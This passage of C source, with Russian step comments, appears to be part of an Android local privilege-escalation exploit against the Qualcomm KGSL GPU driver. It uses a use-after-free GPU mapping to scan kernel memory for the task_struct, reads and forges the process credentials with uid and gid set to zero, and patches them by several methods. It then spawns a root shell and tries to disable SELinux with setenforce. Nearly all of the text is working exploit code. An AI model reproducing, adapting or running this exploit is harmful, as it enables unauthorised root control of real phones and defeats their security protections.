            fprintf(stderr, "[CHILD] [!] SELinux physical address unresolved; skipping write\n");
        }
    }
    else
    {
        fprintf(stderr, "[CHILD] [!] Cannot disable SELinux: kernel_base=0x%llx, selinux_enforcing=0x%llx\n",
                kernel_base, selinux_enforcing);
    }

    // ===== ШАГ 2: Читаем task_struct =====
    fprintf(stderr, "[CHILD] stage=read-taskstruct | reading task_struct...\n");
    int chunk_size = 256;
    int chunks = 4096 / chunk_size;

    for (int chunk = 0; chunk < chunks; chunk++)
    {
        uint64_t offset = chunk * chunk_size;
        if (gpu_read_task_struct(fd, task_va + offset, task_data + offset, chunk_size) != 0)
        {
            fprintf(stderr, "[CHILD] [!] Failed to read chunk %d/%d\n", chunk + 1, chunks);
            gbuf[TASK_SPRAY_CLEAR] = 0x1;
            return;
        }
    }
    fprintf(stderr, "[CHILD] stage=read-taskstruct | task_struct read complete\n");

    // ===== ШАГ 3: Ищем KETO0422 =====
    int marker_found = 0;
    for (int i = 0; i < 4096 - 8; i++)
    {
        if (memcmp(task_data + i, "KETO0422", 8) == 0)
        {
            fprintf(stderr, "[CHILD] Found KETO0422 at offset 0x%x\n", i);
            marker_found = 1;
            break;
        }
    }
    if (!marker_found)
    {
        fprintf(stderr, "[CHILD] [!] KETO0422 not found, continuing with best-effort cred patch\n");
    }

    // ===== ШАГ 4: Ищем cred =====
    fprintf(stderr, "[CHILD] stage=search-cred | searching for cred pointers...\n");
    uint64_t real_cred = 0, cred = 0;
    uint64_t cred_offset = 0;
    uint64_t real_cred_offset = 0;
    if (!find_cred_pointers(task_data, sizeof(task_data), &cred_offset, &real_cred_offset, &cred, &real_cred))
    {
        fprintf(stderr, "[CHILD] stage=fail | reason=cred_search_failed\n");
        fprintf(stderr, "[CHILD] [!] Failed to find cred pointers via extended scan\n");
        gbuf[TASK_SPRAY_CLEAR] = 0x1;
        return;
    }

    fprintf(stderr, "[CHILD] cred_offset=0x%llx real_cred_offset=0x%llx\n",
            cred_offset, real_cred_offset);

    // Логируем физический адрес cred
    uint64_t cred_phys = get_phys_addr_from_pagemap(task_va + cred_offset);
    fprintf(stderr, "[CHILD] cred virtual: 0x%llx, physical: 0x%llx\n",
            task_va + cred_offset, cred_phys);

    if (real_cred == 0 || cred == 0)
    {
        fprintf(stderr, "[CHILD] stage=fail | reason=cred_pointer_empty\n");
        fprintf(stderr, "[CHILD] [!] Failed to find cred pointers\n");
        gbuf[TASK_SPRAY_CLEAR] = 0x1;
        return;
    }

    // ===== ШАГ 5: Читаем оригинальный cred =====
    fprintf(stderr, "[CHILD] stage=read-cred | reading original cred...\n");
    uint8_t cred_data[0x100];
    for (int chunk = 0; chunk < 0x100; chunk += 64)
    {
        if (gpu_read_task_struct(fd, cred + chunk, cred_data + chunk, 64) != 0)
        {
            fprintf(stderr, "[CHILD] [!] Failed to read cred chunk %d\n", chunk / 64);
            gbuf[TASK_SPRAY_CLEAR] = 0x1;
            return;
        }
    }
    fprintf(stderr, "[CHILD] stage=read-cred | cred read complete\n");

    // ===== ШАГ 6: Создаем fake cred =====
    fprintf(stderr, "[CHILD] stage=create-fake-cred | creating fake cred...\n");
    uint64_t fake_cred = (uint64_t)(uintptr_t)(gbuf + 0x500);
    memcpy((void *)fake_cred, cred_data, sizeof(cred_data));

    fprintf(stderr, "[CHILD] Old uid: %u, gid: %u\n",
            *(uint32_t *)(fake_cred + 0x04), *(uint32_t *)(fake_cred + 0x08));

    *(uint32_t *)(fake_cred + 0x04) = 0;
    *(uint32_t *)(fake_cred + 0x08) = 0;
    *(uint32_t *)(fake_cred + 0x0c) = 0;
    *(uint32_t *)(fake_cred + 0x10) = 0;
    *(uint32_t *)(fake_cred + 0x14) = 0;
    *(uint32_t *)(fake_cred + 0x18) = 0;

    fprintf(stderr, "[CHILD] New uid: 0, gid: 0\n");
    fprintf(stderr, "[CHILD] fake_cred at: 0x%llx\n", fake_cred);

    // ===== ШАГ 7: Пытаемся через UAF mmap (приоритетный путь) =====
    fprintf(stderr, "[CHILD] stage=patch-uaf | trying UAF mmap patch...\n");
    fprintf(stderr, "[CHILD] Current path model: GPU->DRAM is active; CPU->L1/L2/L3/L4->DRAM is attempted via /proc/self/mem and /dev/mem\n");
    log_access_context("PATCH_SYNC", "GPU/CPU interleave", "yielding before patch attempt", sched_getcpu(), 0);
    interleave_gpu_cpu_paths();
    fprintf(stderr, "[CHILD] Patch params: task_va=0x%llx cred_offset=0x%llx real_cred_offset=0x%llx fake_cred=0x%llx\n",
            (unsigned long long)task_va, (unsigned long long)cred_offset,
            (unsigned long long)real_cred_offset, (unsigned long long)fake_cred);
    patched = patch_cred_via_uaf_mmap(task_va, cred_offset, real_cred_offset, fake_cred);
    fprintf(stderr, "[CHILD] UAF mmap patch result: %d\n", patched);

    // ===== ШАГ 8: Если не сработало, пробуем /proc/self/mem =====
    if (!patched)
    {
        fprintf(stderr, "[CHILD] stage=patch-proc-mem | trying /proc/self/mem...\n");
        log_cpu_cache_path("PATCH_CPU", "attempting CPU write via /proc/self/mem");
        fprintf(stderr, "[CHILD] /proc/self/mem params: task_va=0x%llx cred_offset=0x%llx real_cred_offset=0x%llx fake_cred=0x%llx\n",
                (unsigned long long)task_va, (unsigned long long)cred_offset,
                (unsigned long long)real_cred_offset, (unsigned long long)fake_cred);
        patched = patch_cred_proc_mem(task_va, cred_offset, real_cred_offset, fake_cred);
        fprintf(stderr, "[CHILD] /proc/self/mem patch result: %d\n", patched);
    }

    // ===== ШАГ 9: Если не сработало, пачим через GPU с проверкой по физическому адресу =====
    if (!patched)
    {
        fprintf(stderr, "[CHILD] stage=patch-gpu | patching cred via GPU with physical verification...\n");
        fprintf(stderr, "[CHILD] GPU phys params: task_va=0x%llx cred_offset=0x%llx real_cred_offset=0x%llx fake_cred=0x%llx\n",
                (unsigned long long)task_va, (unsigned long long)cred_offset,
                (unsigned long long)real_cred_offset, (unsigned long long)fake_cred);
        patched = patch_cred_gpu_with_phys_verify(task_va, cred_offset, real_cred_offset, fake_cred);
        fprintf(stderr, "[CHILD] GPU phys patch result: %d\n", patched);
    }

    // ===== ШАГ 10: ФИНАЛЬНАЯ ВЕРИФИКАЦИЯ =====
    fprintf(stderr, "[CHILD] stage=verify | final verification from both sources...\n");
    int gpu_ok = 0, cpu_ok = 0;
    fprintf(stderr, "[CHILD] Final verification target: task_va=0x%llx cred_offset=0x%llx fake_cred=0x%llx\n",
            (unsigned long long)task_va, (unsigned long long)cred_offset, (unsigned long long)fake_cred);
    int verified = verify_cred_both_sources(task_va, cred_offset, fake_cred, &gpu_ok, &cpu_ok);
    fprintf(stderr, "[CHILD] Final verification summary: verified=%d gpu_ok=%d cpu_ok=%d\n", verified, gpu_ok, cpu_ok);

    if (verified)
    {
        fprintf(stderr, "[CHILD] [+++] CRED VERIFIED FROM BOTH SOURCES!\n");
        patched = 1;
    }

    // ===== ШАГ 11: Пытаемся получить root =====
    fprintf(stderr, "[CHILD] stage=root | attempting to get root...\n");
    setuid(0);
    setgid(0);

    uid_t new_uid = getuid();
    gid_t new_gid = getgid();
    fprintf(stderr, "[CHILD] After setuid/setgid: uid=%d, gid=%d\n", new_uid, new_gid);

    if (new_uid == 0 && new_gid == 0)
    {
        fprintf(stderr, "[CHILD] ============================================\n");
        fprintf(stderr, "[CHILD] [+++] SUCCESS! ROOT ACCESS GRANTED!\n");
        fprintf(stderr, "[CHILD] ============================================\n");
        system("/system/bin/sh");
        gbuf[TASK_SPRAY_CLEAR] = 0x2;
        return;
    }
    else
    {
        fprintf(stderr, "[CHILD] [!] Still not root! uid=%d, gid=%d\n", new_uid, new_gid);
        system("su -c 'id' 2>/dev/null");
        system("setenforce 0 2>/dev/null");
    }

    fprintf(stderr, "[CHILD] Setting TASK_SPRAY_CLEAR=%d (patched=%d, gpu_ok=%d, cpu_ok=%d)\n",
            patched ? 0x2 : 0x1, patched, gpu_ok, cpu_ok);
    gbuf[TASK_SPRAY_CLEAR] = patched ? 0x2 : 0x1;
}

// ================== СТРУКТУРЫ И ФУНКЦИИ СКАНИРОВАНИЯ ==================
struct nonzero_page
{
    uint64_t va;
    uint32_t data[1024];
    int non_zero_count;
};

static int scan_uaf_for_nonzero_multi(int fd, struct nonzero_page *found_pages, int *num_found)
{
    unsigned int ctx_id = 0, ib_id = 0, dst_id = 0;
    uint64_t ib_gpu = 0, dst_gpu = 0;
    void *ib_vma = NULL, *dst_vma = NULL;
    int found = 0;
    *num_found = 0;

    fprintf(stderr, "\n[12] SCANNING UAF (FULL PAGE SCAN - 1024 dwords)\n");
    fprintf(stderr, "      Region: 0x%llx ~ 0x%llx (64MB)\n",
            (unsigned long long)UAF_START,
            (unsigned long long)(UAF_START + UAF_SCAN_SIZE));
    fflush(stderr);

    struct kgsl_drawctxt_create ctx = {
        .flags = KGSL_CONTEXT_PREAMBLE | KGSL_CONTEXT_NO_GMEM_ALLOC};
    if (ioctl(fd, IOCTL_KGSL_DRAWCTXT_CREATE, &ctx) != 0)
    {
        fprintf(stderr, "      [!] Failed to create GPU context\n");
        return 0;
    }
    ctx_id = ctx.drawctxt_id;
    fprintf(stderr, "      [+] Context created: %u\n", ctx_id);

    struct kgsl_gpuobj_alloc ib_alloc = {
        .size = PAGE_SIZE * 8,
        .flags = KGSL_MEMFLAGS_USE_CPU_MAP};
    if (ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &ib_alloc) != 0)
    {
        fprintf(stderr, "      [!] IB alloc failed\n");
        goto cleanup;
    }
    ib_id = ib_alloc.id;
    ib_vma = mmap(NULL, ib_alloc.mmapsize, PROT_READ | PROT_WRITE,
                  MAP_SHARED, fd, ((off_t)ib_id) << 12);
    if (ib_vma == MAP_FAILED)
    {
        fprintf(stderr, "      [!] IB mmap failed\n");
        goto cleanup;
    }

    struct kgsl_gpuobj_info info = {.id = ib_id};
    ioctl(fd, IOCTL_KGSL_GPUOBJ_INFO, &info);
    ib_gpu = info.gpuaddr;
    fprintf(stderr, "      [+] IB GPU: 0x%llx\n", ib_gpu);

    struct kgsl_gpuobj_alloc dst_alloc = {
        .size = PAGE_SIZE,
        .flags = KGSL_MEMFLAGS_USE_CPU_MAP};
    if (ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &dst_alloc) != 0)
    {
        fprintf(stderr, "      [!] DST alloc failed\n");
        goto cleanup;
    }
    dst_id = dst_alloc.id;
    dst_vma = mmap(NULL, dst_alloc.mmapsize, PROT_READ | PROT_WRITE,
                   MAP_SHARED, fd, ((off_t)dst_id) << 12);
    if (dst_vma == MAP_FAILED)
    {
        fprintf(stderr, "      [!] DST mmap failed\n");
        goto cleanup;
    }

    info.id = dst_id;
    ioctl(fd, IOCTL_KGSL_GPUOBJ_INFO, &info);
    dst_gpu = info.gpuaddr;
    fprintf(stderr, "      [+] DST GPU: 0x%llx\n", dst_gpu);

    fprintf(stderr, "      [*] Scanning FULL pages for KETO0422 and kernel pointers...\n");
    fflush(stderr);

    uint64_t current_va = UAF_START;
    uint64_t end_va = UAF_START + UAF_SCAN_SIZE;
    int pages_scanned = 0;
    int marker_found = 0;

    while (current_va < end_va && *num_found < MAX_FOUND_PAGES && !marker_found && pages_scanned < SCAN_MAX_PAGES)
    {
        uint32_t *cmd = (uint32_t *)ib_vma;
        memset(ib_vma, 0, ib_alloc.mmapsize);
        memset(dst_vma, 0, dst_alloc.mmapsize);
        int dw = 0;

        cmd[dw++] = cp_type7_packet(CP_NOP, 0);

        for (int i = 0; i < 1024; i++)
        {
            uint32_t d_lo, d_hi, s_lo, s_hi;
            split64(dst_gpu + (uint64_t)i * 4, &d_lo, &d_hi);
            split64(current_va + (uint64_t)i * 4, &s_lo, &s_hi);

            cmd[dw++] = cp_type7_packet(CP_MEM_TO_MEM, 5);
            cmd[dw++] = 0x00000000;
            cmd[dw++] = d_lo;
            cmd[dw++] = d_hi;
            cmd[dw++] = s_lo;
            cmd[dw++] = s_hi;
        }

        cmd[dw++] = cp_type7_packet(CP_NOP, 0);

        size_t ib_bytes = (size_t)dw * 4;
        msync(ib_vma, ib_bytes, MS_SYNC);

        struct kgsl_command_object cmd_obj = {
            .gpuaddr = ib_gpu,
            .size = ib_bytes,
            .flags = KGSL_CMDLIST_IB,
            .id = ib_id};

        struct kgsl_gpu_command gpu_cmd = {0};
        gpu_cmd.cmdlist = (uint64_t)(uintptr_t)&cmd_obj;
        gpu_cmd.cmdsize = sizeof(cmd_obj);
        gpu_cmd.numcmds = 1;
        gpu_cmd.context_id = ctx_id;

        if (ioctl(fd, IOCTL_KGSL_GPU_COMMAND, &gpu_cmd) != 0)
        {
            fprintf(stderr, "\n      [!] GPU command failed at VA 0x%llx\n", current_va);
            break;
        }

        if (wait_timestamp(fd, ctx_id, gpu_cmd.timestamp) != 0)
        {
            fprintf(stderr, "\n      [!] GPU timeout at VA 0x%llx\n", current_va);
            break;
        }

        msync(dst_vma, dst_alloc.mmapsize, MS_SYNC | MS_INVALIDATE);

        uint32_t *data = (uint32_t *)dst_vma;
        uint8_t *bytes = (uint8_t *)dst_vma;

        pages_scanned++;
        if (pages_scanned % SCAN_PROGRESS_EVERY == 0)
        {
            fprintf(stderr, ".");
            fflush(stderr);
        }

        pid_t comm_pid = -1;
        if (find_marker_in_page(bytes, 4096, current_va, &comm_pid))
        {
            fprintf(stderr,
                    "\n      [!!!] FOUND KETO0422 at VA 0x%llx\n",
                    (unsigned long long)current_va);
            fprintf(stderr, "      [!!!] PARSED PID: %d\n", comm_pid);
            marker_found = 1;

            if (comm_pid > 0)
            {
                *(uint64_t *)&gbuf[TARGET_PIDPID] = comm_pid;
                *(uint64_t *)&gbuf[0xb08] = current_va;

                fprintf(stderr, "      [!!!] TARGET PID: %d (saved to gbuf[0x40])\n", comm_pid);
                fprintf(stderr, "      [!!!] TASK VA: 0x%llx (saved to gbuf[0xb08])\n", current_va);

                for (int si = 0; si < spray_count; si++)
                {
                    if (spray_ctrl[si].pid == comm_pid)
                    {
                        spray_ctrl[si].do_action = 1;
                        fprintf(stderr, "      [!!!] MARKED spray slot %d for PID %d\n", si, comm_pid);
                        break;
                    }
                }

                if (*num_found < MAX_FOUND_PAGES)
                {
                    found_pages[*num_found].va = current_va;
                    memcpy(found_pages[*num_found].data, data, 4096);
                    found_pages[*num_found].non_zero_count = 1;
                    (*num_found)++;
                }

                goto cleanup;
            }
        }

        current_va += PAGE_SIZE * SCAN_PAGE_STEP;
    }

    fprintf(stderr, "\n      [*] Scan complete: scanned %d pages, found %d candidates\n",
            pages_scanned, *num_found);
    fflush(stderr);

cleanup:
    if (dst_vma && dst_vma != MAP_FAILED)
        munmap(dst_vma, dst_alloc.mmapsize);
    if (ib_vma && ib_vma != MAP_FAILED)
        munmap(ib_vma, ib_alloc.mmapsize);

    if (dst_id)
    {
        struct kgsl_gpuobj_free fr = {0};
        fr.id = dst_id;
        ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &fr);
    }
    if (ib_id)
    {
        struct kgsl_gpuobj_free fr = {0};
        fr.id = ib_id;
        ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &fr);
    }

    return marker_found;
}

static int scan_uaf_and_collect(int fd, struct nonzero_page *pages, int *num_pages)
{
    unsigned ctx_id = 0, ib_id = 0, dst_id = 0;
    uint64_t ib_gpu = 0, dst_gpu = 0;
    void *ib_vma = NULL, *dst_vma = NULL;
    int found = 0;
    *num_pages = 0;

    fprintf(stderr, "\n[12b] DEEP SCAN UAF (SEARCHING FOR MARKER + STRUCTS)\n");
    fprintf(stderr, "      Region: 0x%llx ~ 0x%llx\n",
            (unsigned long long)UAF_START,
            (unsigned long long)(UAF_START + UAF_SCAN_SIZE));

    struct kgsl_drawctxt_create ctx = {
        .flags = KGSL_CONTEXT_PREAMBLE | KGSL_CONTEXT_NO_GMEM_ALLOC};
    if (ioctl(fd, IOCTL_KGSL_DRAWCTXT_CREATE, &ctx) != 0)
    {
        fprintf(stderr, "      [!] Failed to create GPU context\n");
        return 0;
    }
    ctx_id = ctx.drawctxt_id;
    fprintf(stderr, "      [+] Context created: %u\n", ctx_id);

    struct kgsl_gpuobj_alloc ib_alloc = {
        .size = PAGE_SIZE * 8,
        .flags = KGSL_MEMFLAGS_USE_CPU_MAP};
    if (ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &ib_alloc) != 0)
    {
        fprintf(stderr, "      [!] IB alloc failed\n");
        goto cleanup;
    }
    ib_id = ib_alloc.id;
    ib_vma = mmap(NULL, ib_alloc.mmapsize, PROT_READ | PROT_WRITE,
                  MAP_SHARED, fd, ((off_t)ib_id) << 12);
    if (ib_vma == MAP_FAILED)
    {
        fprintf(stderr, "      [!] IB mmap failed\n");
        goto cleanup;
    }

    struct kgsl_gpuobj_info info = {.id = ib_id};
    ioctl(fd, IOCTL_KGSL_GPUOBJ_INFO, &info);
    ib_gpu = info.gpuaddr;
    fprintf(stderr, "      [+] IB GPU: 0x%llx\n", ib_gpu);

    struct kgsl_gpuobj_alloc dst_alloc = {
        .size = PAGE_SIZE,
        .flags = KGSL_MEMFLAGS_USE_CPU_MAP};
    if (ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &dst_alloc) != 0)
    {
        fprintf(stderr, "      [!] DST alloc failed\n");
        goto cleanup;
    }
    dst_id = dst_alloc.id;
    dst_vma = mmap(NULL, dst_alloc.mmapsize, PROT_READ | PROT_WRITE,
                   MAP_SHARED, fd, ((off_t)dst_id) << 12);
    if (dst_vma == MAP_FAILED)
    {
        fprintf(stderr, "      [!] DST mmap failed\n");
        goto cleanup;
    }

    info.id = dst_id;
    ioctl(fd, IOCTL_KGSL_GPUOBJ_INFO, &info);
    dst_gpu = info.gpuaddr;
    fprintf(stderr, "      [+] DST GPU: 0x%llx\n", dst_gpu);
    fprintf(stderr, "      [*] Scanning FULL pages for KETO0422 and kernel structs...\n");
    fflush(stderr);

    uint64_t start_va = UAF_START;
    uint64_t end_va = UAF_START + UAF_SCAN_SIZE;
    uint64_t current_va = start_va;
    int pages_scanned = 0;
    uint32_t *rb_count = (uint32_t *)(gbuf + 0xb00);
    int marker_found = 0;

    while (current_va < end_va && *rb_count < MAX_FOUND_PAGES && !marker_found && pages_scanned < SCAN_MAX_PAGES)
    {
        uint32_t *cmd = (uint32_t *)ib_vma;
        memset(ib_vma, 0, ib_alloc.mmapsize);
        memset(dst_vma, 0, dst_alloc.mmapsize);
        int dw = 0;

        cmd[dw++] = cp_type7_packet(CP_NOP, 0);

        for (int i = 0; i < 1024; i++)
        {
            uint32_t d_lo, d_hi, s_lo, s_hi;
            split64(dst_gpu + (uint64_t)i * 4, &d_lo, &d_hi);
            split64(current_va + (uint64_t)i * 4, &s_lo, &s_hi);

            cmd[dw++] = cp_type7_packet(CP_MEM_TO_MEM, 5);
            cmd[dw++] = 0;
            cmd[dw++] = d_lo;
            cmd[dw++] = d_hi;
            cmd[dw++] = s_lo;
            cmd[dw++] = s_hi;
        }

        cmd[dw++] = cp_type7_packet(CP_NOP, 0);

        size_t ib_bytes = (size_t)dw * 4;
        msync(ib_vma, ib_bytes, MS_SYNC);

        struct kgsl_command_object cmd_obj = {
            .gpuaddr = ib_gpu,
            .size = ib_bytes,
            .flags = KGSL_CMDLIST_IB,
            .id = ib_id};

        struct kgsl_gpu_command gpu_cmd = {0};
        gpu_cmd.cmdlist = (uint64_t)(uintptr_t)&cmd_obj;
        gpu_cmd.cmdsize = sizeof(cmd_obj);
        gpu_cmd.numcmds = 1;
        gpu_cmd.context_id = ctx_id;

        if (ioctl(fd, IOCTL_KGSL_GPU_COMMAND, &gpu_cmd) != 0)
            break;
        if (wait_timestamp(fd, ctx_id, gpu_cmd.timestamp) != 0)
            break;

        msync(dst_vma, dst_alloc.mmapsize, MS_SYNC | MS_INVALIDATE);

        uint32_t *data = (uint32_t *)dst_vma;
        uint8_t *bytes = (uint8_t *)dst_vma;

        pages_scanned++;
        if (pages_scanned % SCAN_PROGRESS_EVERY == 0)
        {
            fprintf(stderr, ".");
            fflush(stderr);
        }

        for (int off = 0x800; off < 0x900 - 8; off++)
        {
            if (memcmp(bytes + off, "KETO0422", 8) == 0)
            {
                fprintf(stderr,
                        "\n      [!!!] FOUND KETO0422 in DEEP SCAN at VA 0x%llx offset 0x%03x\n",
                        (unsigned long long)current_va, off);
                marker_found = 1;

                pid_t comm_pid = -1;
                if (off + 13 < 4096)
                {
                    char numbuf[6] = {0};
                    memcpy(numbuf, bytes + off + 8, 5);
                    comm_pid = (pid_t)atoi(numbuf);
                    fprintf(stderr, "      [!!!] PARSED PID: %d\n", comm_pid);
                }

                if (comm_pid > 0)
                {
                    *(uint64_t *)&gbuf[TARGET_PIDPID] = comm_pid;
                    *(uint64_t *)&gbuf[0xb08] = current_va;

                    fprintf(stderr, "      [!!!] TARGET PID: %d (saved to gbuf[0x40])\n", comm_pid);
                    fprintf(stderr, "      [!!!] TASK VA: 0x%llx (saved to gbuf[0xb08])\n", current_va);

                    for (int si = 0; si < spray_count; si++)
                    {
                        if (spray_ctrl[si].pid == comm_pid)
                        {
                            spray_ctrl[si].do_action = 1;
                            fprintf(stderr, "      [!!!] MARKED spray slot %d for PID %d\n", si, comm_pid);
                            break;
                        }
                    }

                    if (*rb_count < MAX_FOUND_PAGES)
                    {
                        uint8_t *slot = (uint8_t *)(gbuf + 0xb08 + (*rb_count) * 24);
                        *(uint64_t *)slot = current_va;
                        (*rb_count)++;
                        fprintf(stderr, "      [!!!] Saved VA to slot %d\n", *rb_count);
                    }

                    if (*num_pages < MAX_FOUND_PAGES)
                    {
                        pages[*num_pages].va = current_va;
                        memcpy(pages[*num_pages].data, data, 4096);
                        pages[*num_pages].non_zero_count = 1;
                        (*num_pages)++;
                    }

                    goto cleanup;
                }
            }
        }

        int non_zero = 0;
        for (int i = 0; i < 1024; i++)
        {
            if (data[i] != 0)
                non_zero++;
        }

        if (non_zero >= 10)
        {
            fprintf(stderr, "\n      [!] Found page with %d non-zero dwords @ VA 0x%llx\n",
                    non_zero, (unsigned long long)current_va);

            if (*rb_count < MAX_FOUND_PAGES)
            {
                uint8_t *slot = (uint8_t *)(gbuf + 0xb08 + (*rb_count) * 24);
                *(uint64_t *)slot = current_va;
                (*rb_count)++;
                fprintf(stderr, "      [*] Saved VA 0x%llx to slot %d\n",
                        (unsigned long long)current_va, *rb_count);
            }

            if (*num_pages < MAX_FOUND_PAGES)
            {
                pages[*num_pages].va = current_va;
                memcpy(pages[*num_pages].data, data, 4096);
                pages[*num_pages].non_zero_count = non_zero;
                (*num_pages)++;
            }
        }

        current_va += PAGE_SIZE * SCAN_PAGE_STEP;
    }

    fprintf(stderr, "\n      [*] Scan done: scanned %d pages, collected %d pages\n",
            pages_scanned, *num_pages);
    found = *num_pages > 0;

cleanup:
    if (dst_id)
    {
        struct kgsl_gpuobj_free fr = {0};
        fr.id = dst_id;
        ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &fr);
    }
    if (ib_id)
    {
        struct kgsl_gpuobj_free fr = {0};
        fr.id = ib_id;
        ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &fr);
    }
    if (dst_vma && dst_vma != MAP_FAILED)
        munmap(dst_vma, dst_alloc.mmapsize);
    if (ib_vma && ib_vma != MAP_FAILED)
        munmap(ib_vma, ib_alloc.mmapsize);

    return found;
}

static void recover_origin(int fd)
{
    uint64_t patched_va[64] = {0};
    uint64_t saved_pte0[64] = {0};
    size_t patched_cnt = 0;
    uint32_t rb_count = *(uint32_t *)(gbuf + 0xb00);

    fprintf(stderr, "[RECOVER] Starting PTE recovery, count=%u\n", rb_count);

    for (uint32_t i = 0; i < rb_count && patched_cnt < sizeof(patched_va) / sizeof(patched_va[0]); i++)
    {
        patched_va[patched_cnt] = *(uint64_t *)(gbuf + 0xb08 + i * 24);
        saved_pte0[patched_cnt] = *(uint64_t *)(gbuf + PTE_SAVE_BASE + i * 8);
        patched_cnt++;
    }

    struct kgsl_drawctxt_create ctx = {
        .flags = KGSL_CONTEXT_PREAMBLE | KGSL_CONTEXT_NO_GMEM_ALLOC};
    if (ioctl(fd, IOCTL_KGSL_DRAWCTXT_CREATE, &ctx) != 0)
    {
        perror("recover_origin: ctx create");
        return;
    }
    unsigned ctx_id = ctx.drawctxt_id;
    fprintf(stderr, "[RECOVER] Context created: %u\n", ctx_id);

    struct kgsl_gpuobj_alloc ib_alloc = {
        .size = PAGE_SIZE * 2,
        .flags = KGSL_MEMFLAGS_USE_CPU_MAP};
    if (ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &ib_alloc) != 0)
    {
        perror("recover_origin: ib alloc");
        return;
    }
    unsigned ib_id = ib_alloc.id;
    void *ib_vma = mmap(NULL, ib_alloc.mmapsize, PROT_READ | PROT_WRITE,
                        MAP_SHARED, fd, ((off_t)ib_id) << 12);
    if (ib_vma == MAP_FAILED)
    {
        perror("recover_origin: ib mmap");
        struct kgsl_gpuobj_free fr = {0};
        fr.id = ib_id;
        ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &fr);
        return;
    }

    struct kgsl_gpuobj_info info = {.id = ib_id};
    ioctl(fd, IOCTL_KGSL_GPUOBJ_INFO, &info);
    uint64_t ib_gpu = info.gpuaddr;

    struct kgsl_gpuobj_alloc dst_alloc = {
        .size = PAGE_SIZE,
        .flags = KGSL_MEMFLAGS_USE_CPU_MAP};
    if (ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &dst_alloc) != 0)
    {
        perror("recover_origin: dst alloc");
        munmap(ib_vma, ib_alloc.mmapsize);
        struct kgsl_gpuobj_free fr = {0};
        fr.id = ib_id;
        ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &fr);
        return;
    }
    unsigned dst_id = dst_alloc.id;
    void *dst_vma = mmap(NULL, dst_alloc.mmapsize, PROT_READ | PROT_WRITE,
                         MAP_SHARED, fd, ((off_t)dst_id) << 12);
    if (dst_vma == MAP_FAILED)
    {
        perror("recover_origin: dst mmap");
        munmap(ib_vma, ib_alloc.mmapsize);
        struct kgsl_gpuobj_free fr = {0};
        fr.id = ib_id;
        ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &fr);
        fr.id = dst_id;
        ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &fr);
        return;
    }
    struct kgsl_gpuobj_info dst_info = {.id = dst_id};
    ioctl(fd, IOCTL_KGSL_GPUOBJ_INFO, &dst_info);
    uint64_t dst_gpu = dst_info.gpuaddr;

    for (size_t i = 0; i < patched_cnt; i++)
    {
        uint64_t base = patched_va[i];
        if (!base)
            continue;
        uint64_t orig_pte0 = saved_pte0[i];
        if (!orig_pte0)
            continue;

        uint32_t *cmd = (uint32_t *)ib_vma;
        memset(ib_vma, 0, ib_alloc.mmapsize);
        int dw = 0;
        uint32_t d_lo, d_hi, s_lo, s_hi;

        cmd[dw++] = cp_type7_packet(CP_NOP, 0);
        split64(dst_gpu, &d_lo, &d_hi);
        split64(base + 0x8, &s_lo, &s_hi);
        cmd[dw++] = cp_type7_packet(CP_MEM_TO_MEM, 5);
        cmd[dw++] = 0;
        cmd[dw++] = d_lo;
        cmd[dw++] = d_hi;
        cmd[dw++] = s_lo;
        cmd[dw++] = s_hi;
        cmd[dw++] = cp_type7_packet(CP_NOP, 0);

        size_t bytes = (size_t)dw * 4;
        msync(ib_vma, bytes, MS_SYNC);

        struct kgsl_command_object obj = {
            .gpuaddr = ib_gpu,
            .size = bytes,
            .flags = KGSL_CMDLIST_IB,
            .id = ib_id};

        struct kgsl_gpu_command c = {0};
        c.cmdlist = (uint64_t)(uintptr_t)&obj;
        c.cmdsize = sizeof(obj);
        c.numcmds = 1;
        c.context_id = ctx_id;

        uint64_t pte1 = 0;
        if (ioctl(fd, IOCTL_KGSL_GPU_COMMAND, &c) != 0 ||
            wait_timestamp(fd, ctx_id, c.timestamp) != 0)
        {
            continue;
        }
        else
        {
            msync(dst_vma, 8, MS_SYNC | MS_INVALIDATE);
            pte1 = *(uint64_t *)dst_vma;
        }

        memset(ib_vma, 0, ib_alloc.mmapsize);
        dw = 0;
        split64(base + 8, &d_lo, &d_hi);
        cmd[dw++] = cp_type7_packet(CP_MEM_WRITE, 3);
        cmd[dw++] = d_lo;
        cmd[dw++] = d_hi;
        cmd[dw++] = (uint32_t)(orig_pte0 & 0xffffffffu);

        split64(base + 12, &d_lo, &d_hi);
        cmd[dw++] = cp_type7_packet(CP_MEM_WRITE, 3);
        cmd[dw++] = d_lo;
        cmd[dw++] = d_hi;
        cmd[dw++] = (uint32_t)(orig_pte0 >> 32);
        cmd[dw++] = cp_type7_packet(CP_NOP, 0);

        bytes = (size_t)dw * 4;
        msync(ib_vma, bytes, MS_SYNC);

        obj.size = bytes;
        memset(&c, 0, sizeof(c));
        c.cmdlist = (uint64_t)(uintptr_t)&obj;
        c.cmdsize = sizeof(obj);
        c.numcmds = 1;
        c.context_id = ctx_id;

        if (ioctl(fd, IOCTL_KGSL_GPU_COMMAND, &c) != 0 ||
            wait_timestamp(fd, ctx_id, c.timestamp) != 0)
        {
            fprintf(stderr, "[RECOVER] GPU restore failed for VA 0x%llx\n",
                    (unsigned long long)base);
        }
        else
        {
            fprintf(stderr, "[RECOVER] [+] restored PTE0 at VA 0x%llx\n",
                    (unsigned long long)base);
        }
    }

    munmap(ib_vma, ib_alloc.mmapsize);
    struct kgsl_gpuobj_free fr = {0};
    fr.id = ib_id;
    ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &fr);
    munmap(dst_vma, dst_alloc.mmapsize);
    fr.id = dst_id;
    ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &fr);
}

static int mmap_spray_done;
static void mmap_spray(void)
{
    fprintf(stderr, "\n[13] mmap-spraying user VA space\n");
